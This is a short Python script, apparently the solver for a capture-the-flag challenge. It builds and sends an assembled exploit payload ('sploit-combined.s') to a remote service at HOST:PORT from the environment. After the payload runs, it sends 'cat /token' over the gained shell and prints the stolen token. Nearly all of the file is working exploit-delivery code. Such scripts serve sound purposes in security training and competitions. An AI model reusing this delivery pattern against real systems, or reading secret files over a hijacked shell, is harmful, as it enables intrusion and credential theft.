import os
import socket
import subprocess

port = os.environ["PORT"]
host = os.environ["HOST"]

subprocess.call("./build.sh", shell=True)

fh = open("sploit-combined.s", "rb")
sploit_combined = fh.read()
fh.close()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, int(port)))

sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

sock.recv(1024) # Wait
sock.sendall(b"4\n")
while b"entering your program" not in sock.recv(1024):
    continue
sock.sendall(sploit_combined)
sock.sendall(b"END_PROGRAM\n")
    
while b"Running" not in sock.recv(1024):
    continue
sock.sendall(b"cat /token\n")
token = sock.recv(1024)
print("TOKEN={}".format(str(token, 'utf8')))
sock.sendall(b"exit\n")
sock.close()